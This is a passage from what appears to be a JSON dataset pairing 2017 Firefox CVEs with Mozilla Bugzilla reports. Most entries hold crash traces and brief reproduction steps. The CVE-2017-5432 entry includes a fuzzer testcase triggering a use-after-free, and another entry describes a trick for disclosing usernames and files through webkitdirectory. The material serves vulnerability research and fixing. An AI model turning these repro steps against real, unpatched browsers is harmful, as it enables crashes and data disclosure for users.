xul!mozilla::dom::Function::Call<nsCOMPtr<nsISupports> >+0xc1 010ff160 67192647 11ac8520 10f3dce0 11a82010 xul!nsGlobalWindow::RunTimeoutHandler+0x148 010ff204 67190e54 11ac8520 0000000d 11ac8520 xul!mozilla::dom::TimeoutManager::RunTimeout+0x2b8 010ff218 672b6373 11a6d910 11ac8520 11a82010 xul!mozilla::dom::`anonymous namespace'::TimerCallback+0x1f 010ff290 672b62c4 115285c0 115285f4 00000000 xul!nsTimerImpl::Fire+0x9b 010ff2cc 67193ae0 11a82010 0170e160 090d7a04 xul!nsTimerEvent::Run+0x45 010ff2f0 67193a63 68f96ac4 010ff36c 67269171 xul!mozilla::ThrottledEventQueue::Inner::ExecuteRunnable+0x76 010ff2fc 67269171 11ab9240 01704980 6974b601 xul!mozilla::ThrottledEventQueue::Inner::Executor::Run+0xf 010ff36c 67194b98 0170e160 6974b601 010ff387 xul!nsThread::ProcessNextEvent+0x14d 010ff388 672678a7 010ff560 01704970 010ff560 xul!NS_ProcessNextEvent+0x16 010ff3b0 67c133d1 010ff560 010ff560 00000000 xul!mozilla::ipc::MessagePump::Run+0xcc 010ff3cc 673454f9 010ff560 c0f8122d 090d7a00 xul!mozilla::ipc::MessagePumpForChildProcess::Run+0x58 010ff404 673454c8 0170e160 00000002 090d7a00 xul!MessageLoop::RunHandler+0x20 010ff424 67535f2e 01704970 010ff560 010ff444 xul!MessageLoop::Run+0x19 010ff434 67535cbd 090d7a00 01704970 010ff458 xul!nsBaseAppShell::Run+0x34 010ff444 68a23084 090d7a00 01704970 090d7a00 xul!nsAppShell::Run+0x26 010ff458 67c1338f 010ff560 01704970 010ff4a0 xul!XRE_RunAppShell+0x26 010ff468 673454f9 010ff560 c0f81289 00000003 xul!mozilla::ipc::MessagePumpForChildProcess::Run+0x16 010ff4a0 673454c8 0172a000 00000001 69019200 xul!MessageLoop::RunHandler+0x20 010ff4c0 68a22d9b 01701040 0000000b 00000000 xul!MessageLoop::Run+0x19 010ff62c 002b9ce9 0000000b 01701040 010ff64c xul!XRE_InitChildProcess+0x55f 010ff658 002b7e22 6f1672e4 6f1672ec 013c7298 firefox!content_process_main+0x70 010ff9e4 002b5e37 0000000c ffcd16c0 013cbd50 firefox!wmain+0x4e92 010ffa2c 772b38f4 00e4f000 772b38d0 d8aedd39 firefox!__scrt_common_main_seh+0xf9 010ffa40 77d65de3 00e4f000 d87b03d4 00000000 KERNEL32!BaseThreadInitThunk+0x24 010ffa88 77d65dae ffffffff 77d8b7e7 00000000 ntdll!__RtlUserThreadStart+0x2f 010ffa98 00000000 002b5ead 00e4f000 00000000 ntdll!_RtlUserThreadStart+0x1b FAULTING_SOURCE_LINE: c:\\builds\\moz2_slave\\m-cen-w32-ntly-000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\buffer11.cpp FAULTING_SOURCE_FILE: c:\\builds\\moz2_slave\\m-cen-w32-ntly-000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\buffer11.cpp FAULTING_SOURCE_LINE_NUMBER: 807 FAULTING_SOURCE_CODE: 803: latestBuffer = stagingBuffer; 804: } 805: 806: CopyResult copyResult = CopyResult::NOT_RECREATED; > 807: ANGLE_TRY_RESULT(storage->copyFromStorage(latestBuffer, sourceOffset, storageSize, 0), 808: copyResult); 809: // If the D3D buffer has been recreated, we should update our serial. 810: if (copyResult == CopyResult::RECREATED) 811: { 812: updateSerial(); SYMBOL_STACK_INDEX: 0 SYMBOL_NAME: libglesv2!rx::Buffer11::updateBufferStorage+db FOLLOWUP_NAME: MachineOwner MODULE_NAME: libGLESv2 IMAGE_NAME: libGLESv2.dll DEBUG_FLR_IMAGE_TIMESTAMP: 585bd734 STACK_COMMAND: ~59s ; kb BUCKET_ID: INVALID_POINTER_READ_IN_CALL_libglesv2!rx::Buffer11::updateBufferStorage+db PRIMARY_PROBLEM_CLASS: INVALID_POINTER_READ_IN_CALL_libglesv2!rx::Buffer11::updateBufferStorage+db FAILURE_PROBLEM_CLASS: INVALID_POINTER_READ_IN_CALL FAILURE_EXCEPTION_CODE: c0000005 FAILURE_IMAGE_NAME: libGLESv2.dll FAILURE_FUNCTION_NAME: rx::Buffer11::updateBufferStorage FAILURE_SYMBOL_NAME: libGLESv2.dll!rx::Buffer11::updateBufferStorage FAILURE_BUCKET_ID: INVALID_POINTER_READ_IN_CALL_c0000005_libGLESv2.dll!rx::Buffer11::updateBufferStorage ANALYSIS_SOURCE: UM FAILURE_ID_HASH_STRING: um:invalid_pointer_read_in_call_c0000005_libglesv2.dll!rx::buffer11::updatebufferstorage FAILURE_ID_HASH: {7530445f-e192-bd84-04e5-903b912a400c} Followup: MachineOwner --------- Variables shows that the storage object had been freed: storage 0x11ab9280 class rx::Buffer11::BufferStorage * angle::NonCopyable class angle::NonCopyable __vfptr 0xe5e5e5e5 mRenderer 0xe5e5e5e5 class rx::Renderer11 * mRevision 0xe5e5e5e5 mUsage 0n-437918235 (No matching enumerant) mBufferSize 0xe5e5e5e5 sourceOffset 0 storageSize 0xa42 ANGLE_LOCAL_VAR class gl::ErrorOrResult<rx::Buffer11::BufferStorage *> ANGLE_LOCAL_VAR class gl::ErrorOrResult<enum rx::`anonymous namespace'::CopyResult> ANGLE_LOCAL_VAR class gl::ErrorOrResult<rx::Buffer11::NativeStorage *> copyResult <Value unavailable> latestBuffer 0x11afc280 class rx::Buffer11::BufferStorage * rx::BufferD3D::mNextSerial <Value unavailable> this 0x11afc280 class rx::Buffer11 * __vtcast_rx::Buffer11::NativeStorage class rx::Buffer11::NativeStorage rx::BufferD3D class rx::BufferD3D mRenderer 0x68f8ec90 class rx::Renderer11 * mSize 0x68f8bc90 mMappedStorage 0x00000000 class rx::Buffer11::BufferStorage * mBufferStorages class std::array<rx::Buffer11::BufferStorage *,8> mDeallocThresholds class std::array<unsigned int,8> mIdleness class std::array<unsigned int,8> mConstantBufferRangeStoragesCache class std::map<long,rx::Buffer11::ConstantBufferCacheEntry,std::less<long>,std::allocator<std::pair<long const ,rx::Buffer11::ConstantBufferCacheEntry> > > mConstantBufferStorageAdditionalSize 0 mMaxConstantBufferLruCount 0 mStaticBroadcastChannel class angle::BroadcastChannel mDirectBroadcastChannel class angle::BroadcastChannel"
      }
    ],
    "CVE-2017-5412": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1328323",
        "title": "Heap-buffer-overflow read in ColorComponentAtPoint",
        "description": "Tested on: OS: Ubuntu 16.04 Firefox: ASAN build of moz_source_stamp: 2bd53e4e662bcdd32c53cb4e09ceff088e8f6369 Minimized repro-file as an attachment. ASAN-trace: ================================================================= ==18497==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f2f4ae127ff at pc 0x7f2f82468ba2 bp 0x7ffcbafc13d0 sp 0x7ffcbafc13c8 READ of size 1 at 0x7f2f4ae127ff thread T0 #0 0x7f2f82468ba1 in ColorComponentAtPoint /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2279:10 #1 0x7f2f82468ba1 in GenerateNormal<int> /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3439 #2 0x7f2f82468ba1 in DoRender<int> /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3537 #3 0x7f2f82468ba1 in mozilla::gfx::FilterNodeLightingSoftware<mozilla::gfx::(anonymous namespace)::DistantLightSoftware, mozilla::gfx::(anonymous namespace)::DiffuseLightingSoftware>::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3464 #4 0x7f2f823f2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:613:21 #5 0x7f2f823fc34e in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:714:17 #6 0x7f2f8242b2a4 in mozilla::gfx::FilterNodeCropSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3126:10 #7 0x7f2f823f2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:613:21 #8 0x7f2f823bd6db in mozilla::gfx::FilterNodeSoftware::Draw(mozilla::gfx::DrawTarget*, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:566:14 #9 0x7f2f824c9f41 in mozilla::gfx::FilterSupport::RenderFilterDescription(mozilla::gfx::DrawTarget*, mozilla::gfx::FilterDescription const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, nsTArray<RefPtr<mozilla::gfx::SourceSurface> >&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/src/FilterSupport.cpp:1360:3 #10 0x7f2f876843ce in nsFilterInstance::Render(mozilla::gfx::DrawTarget*) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:510:3 #11 0x7f2f876837e0 in nsFilterInstance::PaintFilteredFrame(nsIFrame*, mozilla::gfx::DrawTarget*, gfxMatrix const&, nsSVGFilterPaintCallback*, nsRegion const*) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:79:10 . . . 0x7f2f4ae127ff is located 1 bytes to the left of 260175-byte region [0x7f2f4ae12800,0x7f2f4ae5204f) allocated by thread T0 here: #0 0x4b24ab in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x7f2f824a71c3 in Realloc /home/worker/workspace/build/src/gfx/2d/Tools.h:181:41 #2 0x7f2f824a71c3 in mozilla::gfx::SourceSurfaceAlignedRawData::Init(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool, unsigned char, int) /home/worker/workspace/build/src/gfx/2d/SourceSurfaceRawData.cpp:66 #3 0x7f2f823875a8 in mozilla::gfx::Factory::CreateDataSourceSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool) /home/worker/workspace/build/src/gfx/2d/Factory.cpp:818:7 #4 0x7f2f8240ef08 in mozilla::gfx::FilterProcessing::ExtractAlpha(mozilla::gfx::DataSourceSurface*) /home/worker/workspace/build/src/gfx/2d/FilterProcessing.cpp:16:37 #5 0x7f2f82466882 in DoRender<int> /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3503:13 #6 0x7f2f82466882 in mozilla::gfx::FilterNodeLightingSoftware<mozilla::gfx::(anonymous namespace)::DistantLightSoftware, mozilla::gfx::(anonymous namespace)::DiffuseLightingSoftware>::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3464 #7 0x7f2f823f2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:613:21 #8 0x7f2f823fc34e in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:714:17 #9 0x7f2f8242b2a4 in mozilla::gfx::FilterNodeCropSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3126:10 #10 0x7f2f823f2f6a in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:613:21 #11 0x7f2f823bd6db in mozilla::gfx::FilterNodeSoftware::Draw(mozilla::gfx::DrawTarget*, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:566:14 . . ."
      }
    ],
    "CVE-2017-5413": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1337504",
        "title": "SEGV in ClearBidiControls",
        "description": "Tested on: OS: Ubuntu 16.04 Firefox: ASAN build sourcestamp: 6d27535f4fe912068e0a0ac5854f7f39e94964a5 ASAN-trace: ASAN:DEADLYSIGNAL ================================================================= ==15061==ERROR: AddressSanitizer: SEGV on unknown address 0x7fff31db57ac (pc 0x7f6b5302adfa bp 0x7ffd31db56d0 sp 0x7ffd31db5320 T0) #0 0x7f6b5302adf9 in ClearBidiControls /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:313:21 #1 0x7f6b5302adf9 in ResolveParagraphWithinBlock /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:1226 #2 0x7f6b5302adf9 in nsBidiPresUtils::TraverseFrames(nsBlockFrame*, nsBlockInFlowLineIterator*, nsIFrame*, BidiParagraphData*) /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:1192 #3 0x7f6b530295e6 in nsBidiPresUtils::Resolve(nsBlockFrame*) /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:697:5 #4 0x7f6b531e02b9 in ResolveBidi /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:7458:10 #5 0x7f6b531e02b9 in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1176 #6 0x7f6b532438d0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, unsigned int&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3 #7 0x7f6b53247f0e in nsColumnSetFrame::ReflowChildren(mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) /home/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:648:7 #8 0x7f6b5324c896 in ReflowColumns /home/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:354:19 #9 0x7f6b5324c896 in nsColumnSetFrame::FindBestBalanceBSize(mozilla::ReflowInput const&, nsPresContext*, nsColumnSetFrame::ReflowConfig&, nsColumnSetFrame::ColumnBalanceData&, mozilla::ReflowOutput&, nsCollapsingMargin&, bool&, bool&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:984 #10 0x7f6b5324d9dd in nsColumnSetFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:1093:5 #11 0x7f6b5320082d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, unsigned int&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3 #12 0x7f6b531f6158 in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3466:7 #13 0x7f6b531e9c26 in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2835:5 #14 0x7f6b531e9c26 in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2374 #15 0x7f6b531e0654 in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #16 0x7f6b5320082d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, unsigned int&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3 . . ."
      }
    ],
    "CVE-2017-5414": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1319370",
        "title": "webkitdirectory - OS username disclosure",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36 Steps to reproduce: Tested on latest Nightly 53.0a1 (2016-11-21) (64-bit) -----------OS username disclosure-------- The webkitdirectory on fresh install and profile (or new website where directory has never been uploaded) seems to always default to 'C:\\Users\\{user}\\Desktop' 1. Open PoC on a fresh URL where directory uploading has never been performed (to make sure it defaults to dekstop) 2. Hold down enter 3. Since webkitdirectory keeps going back a folder every time its used, we only need to make sure a victim keeps hitting enter for at least 2-3 upload dialogues and then we would have successfully grabbed the OS username. ------------Arbitrary File Disclosure-------- Say you go to website 'A' and you upload a directory (doesn't actually have to upload, just as long as you loaded files) that exists in the folder 'C:\\Users\\{user}\\Documents\\', if we are able to run the attached PoC on website 'A' (say XSS or if website 'A' is codepen/jsfiddle..etc) we will be able to fool the user into uploading the entire contents of the 'My Documents' folder. Here is one scenario: 1. Victim visits a codepen link that showcases html5 webkitdirectory. 2. Victim tests this new feature by uploading/selecting a random folder within 'My documents' then forgets about it. 3. Victim receives an attackers website which embeds a codepen code that uses the PoC here. 4. Victim then knowingly exposes his/her files. As I mentioned, this can also be done with XSS vulnerabilities or possibly even URL spoofing. Actual results: In both scenarios we either disclose OS username or we have access to arbitrary files on victims computer. Expected results: Two suggestions: 1. Prevent input.click() from bypassing popup blocker, only allow it from mouse clicks. 2. Prevent the behavior where within the Documents folder and its contents (sub folders as well) be uploaded without explicitly choosing such an action. For some reason #2 so far only works on Documents folder, the folder uploader seems to ignore this behavior when on C: or desktop folder and others. But if it worked for My Documents my guess is it would work on other locations."
      }
    ],
    "CVE-2017-5415": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1321719",
        "title": "Address bar spoof using blob URI scheme",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36 Steps to reproduce: Tested on latest nightly with and without e10s. Does not work on latest stable, posting regression range soon. Run attached PoC Actual results: We can change location.pathname which leads to spoof Expected results: It's blocked in stable"
      }
    ],
    "CVE-2017-5416": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1328121",
        "title": "nightly crash when using ebay/paypal [@ nsDocumentOpenInfo::OnStartRequest ]",
        "description": "Crash id: https://crash-stats.mozilla.com/report/index/d2771913-daf5-4266-8e79-f62142170102 What I did: Buy a thing using ebay.com.au Select PayPal payment method Enter your Paypal details It spins for a few seconds, then crashes. Crash was 100% reproducible and I've made ~6 identical crash reports. I have made the payment since, so now I can no longer try (such as without addons), sorry."
      }
    ],
    "CVE-2017-5417": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=791597",
        "title": "Dragging and dropping URLs leads to address bar spoofing",
        "description": "Demo: http://lcamtuf.coredump.cx/urldrag/"
      }
    ],
    "CVE-2017-5418": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1338876",
        "title": "Out of bound access in nsHttpDigestAuth::ParseChallenge",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Steps to reproduce: 1. Build firefox with valgrind using instructions mentioned in https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Valgrind 2. Download and copy auth.php to local web server. 3. Start firefox export VALGRIND_OPTIONS=\"--smc-check=all-non-file --vex-iropt-register-updates=allregs-at-mem-access --show-mismatched-frees=no --read-inline-info=yes\" ./mach run --debugger=\"valgrind\" --debugger-args=\"$VALGRIND_OPTIONS\" 4. Visit http://127.0.0.1/auth.php Actual results: Valgrind reports this error. ==3063== Conditional jump or move depends on uninitialised value(s) ==3063== at 0x101B8F28: mozilla::net::nsHttpDigestAuth::ParseChallenge(char const*, nsACString_internal&, nsACString_internal&, nsACString_internal&, nsACString_internal&, bool*, unsigned short*, unsigned short*) [clone .part.144] (nsHttpDigestAuth.cpp:577) ==3063== by 0x101B958E: ParseChallenge (nsHttpDigestAuth.cpp:163) ==3063== by 0x101B958E: mozilla::net::nsHttpDigestAuth::ChallengeReceived(nsIHttpAuthenticableChannel*, char const*, bool, nsISupports**, nsISupports**, bool*) (nsHttpDigestAuth.cpp:152) ==3063== by 0x1016B6B9: mozilla::net::nsHttpChannelAuthProvider::GetCredentialsForChallenge(char const*, char const*, bool, nsIHttpAuthenticator*, nsCString&) (nsHttpChannelAuthProvider.cpp:790) ==3063== by 0x1016C3DE: mozilla::net::nsHttpChannelAuthProvider::GetCredentials(char const*, bool, nsCString&) (nsHttpChannelAuthProvider.cpp:618) ==3063== by 0x1016C72F: mozilla::net::nsHttpChannelAuthProvider::ProcessAuthentication(unsigned int, bool) (nsHttpChannelAuthProvider.cpp:198) ==3063== by 0x101F01C5: mozilla::net::nsHttpChannel::ContinueProcessResponse2(nsresult) [clone .part.419] [clone .constprop.487] (nsHttpChannel.cpp:2209) ==3063== by 0x101F091F: ContinueProcessResponse2 (nsCOMPtr.h:294) ==3063== by 0x101F091F: mozilla::net::nsHttpChannel::ContinueProcessResponse1() (nsHttpChannel.cpp:2089) ==3063== by 0x101F0B6E: mozilla::net::nsHttpChannel::ProcessResponse() (nsHttpChannel.cpp:2009) ==3063== by 0x101F13A5: mozilla::net::nsHttpChannel::OnStartRequest(nsIRequest*, nsISupports*) (nsHttpChannel.cpp:6523) ==3063== by 0xFEA068D: nsInputStreamPump::OnStateStart() (nsInputStreamPump.cpp:524) ==3063== by 0xFEA118F: nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) (nsInputStreamPump.cpp:426) ==3063== by 0xFDFB013: nsInputStreamReadyEvent::Run() (nsStreamUtils.cpp:96) ==3063== Expected results: Should not have read out of bound value."
      }
    ],
    "CVE-2017-5420": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1284395",
        "title": "Show about:blank (placeholder \"Search or enter address\" in the URL bar) (spoof)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 Steps to reproduce: Open PoC.html and follow instructions Actual results: Ended up with completely empty address bar Expected results: Main problem I think is the ability to be able to navigate to 'about:home' So my initial expectation is that about: pages which are a) Openable by content b) Have an empty address bar by default Should not be openable by content. (So far im only aware of about:home that does this, 'about:newtab' does not meet requirement [a]) Note: As far as I can tell, this is not a dupe of Bug 1247968 (not fixed) or Bug 1228754 (fixed) but its worth making sure it isn't"
      }
    ],
    "CVE-2017-5421": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1301876",
        "title": "Print preview hijacking leads to potential spoof",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 Firefox for Android Steps to reproduce: This requires popups to be allowed. If we open a url within onbeforeprint event, we can trick a victim into thinking theyre in a trusted website. Open attached PoC and follow instructions. Actual results: We are able to hijack the print preview window with any HTML and javascript we like. Expected results: New content should have been blocked, as usually print preview has no javascript in it. But having these active contents might be a problem."
      }
    ],
    "CVE-2017-5422": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1295002",
        "title": "Recursive keyword fixup for many-nested view-source: URLs crashes",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Build ID: 20160726073904 Steps to reproduce: Lots of view-source: strung together cause the browser to crash. Actual results: The browser crashed. Expected results: Viewing the source of view-source is pointless & should be blocked."
      }
    ],
    "CVE-2017-5425": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1322716",
        "title": "Overly inclusive regex used in Mac GMP sandbox profile exposes users' data to GMP processes",
        "description": "The GMP sandbox profile includes the following regex to allow access to files in /private/var. From security/sandbox/mac/Sandbox.mm, 135 \"(allow file-read*\\n\" ... 138 \" (regex #\\\"^/(private/)?var($|/)\\\")\\n\" It's unlikely we need to allow read access to the entire /private/var directory tree which contains sensitive state from programs that use /private/var to store data. One example of private information being stored here is images received by text message through the OS X Messages app: /private/var/folders/.../com.apple.iChat/Messages/Images/<UUID>.jpg The GMP process shouldn't be able to read personal pictures. On OS X, the value of $TMPDIR is /var/folders/... where /var is a symlink to /private/var so the regex includes $TMPDIR which may be widely used. We should try to limit the regex to only include subdirectories we need. Impact on the current _content_ sandbox is TBD. The content sandbox does allow access to some files in /private/var using regex that are much more constrained. I'd like to do another audit focusing on /private/var to confirm how much we allow. Here's a list of files paths that I previously generated. https://wiki.mozilla.org/Sandbox/OS_X_Rule_Set#How_security.sandbox.content.level_Affects_File_Access"
      }
    ],
    "CVE-2017-5428": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1348168",
        "title": "integer overflow in createImageBitmap() overload accepting ArrayBuffer and ArrayBufferView arguments (pwn2own 2017)",
        "description": "this is the vuln we got from pwn2own. more later."
      }
    ],
    "CVE-2017-5429": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1343261%2C1350844%2C1341096%2C1342823%2C1348894%2C1348941%2C1349340%2C1352926%2C1353088%2C",
        "description": "this is the vuln we got from pwn2own. more later."
      }
    ],
    "CVE-2017-5430": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1342101%2C1340482%2C1344686%2C1329796%2C1346419%2C1349621%2C1344081%2C1344305%2C1348143%2C1349719%2C1353476%2C1337418%2C1346140%2C1339722",
        "description": "this is the vuln we got from pwn2own. more later."
      }
    ],
    "CVE-2017-5432": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1346654",
        "title": "heap-use-after-free in nsFrameSelection::MoveCaret",
        "description": "The latest ASAN build of Firefox crashes when loading the following testcase. The testcase requires the fuzzPriv extension. cript> function start() { o1=document.createElement('iframe'); o1.src=\"data:text/html,<div>\"; o1.addEventListener('load', fun0,false); document.body.appendChild(o1); } function fun0() { a=o1.contentDocument.documentElement; o91=document.createElement('textarea'); a.appendChild(o91); a.style.position='absolute'; o91.focus(); o1.contentWindow.onresize=fun1; o1.height='-8px'; fuzzPriv.trustedKeyEvent(a,'press',false,false,true,false,35,0); } function fun1() { a.setAttribute('style','right:auto;'); a.animate([{textShadow: ''},{textShadow: '',}],20); fuzzPriv.CC(); fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==19751==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110002f4638 at pc 0x7fc2c18ef7ec bp 0x7fff28c6f7b0 sp 0x7fff28c6f7a8 READ of size 8 at 0x6110002f4638 thread T0 (Web Content) #0 0x7fc2c18ef7eb in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:972:8 #1 0x7fc2c0ee9be3 in mozilla::SelectionMoveCommands::DoCommand(char const*, nsISupports*) /home/worker/workspace/build/src/editor/libeditor/EditorCommands.cpp:892:14 #2 0x7fc2bf247366 in nsControllerCommandTable::DoCommand(char const*, nsISupports*) /home/worker/workspace/build/src/dom/commandhandler/nsControllerCommandTable.cpp:147:10 #3 0x7fc2bf23dd2a in nsBaseCommandController::DoCommand(char const*) /home/worker/workspace/build/src/dom/commandhandler/nsBaseCommandController.cpp:136:10 #4 0x7fc2c091c3a8 in nsXBLPrototypeHandler::DispatchXBLCommand(mozilla::dom::EventTarget*, nsIDOMEvent*) /home/worker/workspace/build/src/dom/xbl/nsXBLPrototypeHandler.cpp:498:5 #5 0x7fc2c08f2fbf in nsXBLPrototypeHandler::ExecuteHandler(mozilla::dom::EventTarget*, nsIDOMEvent*) 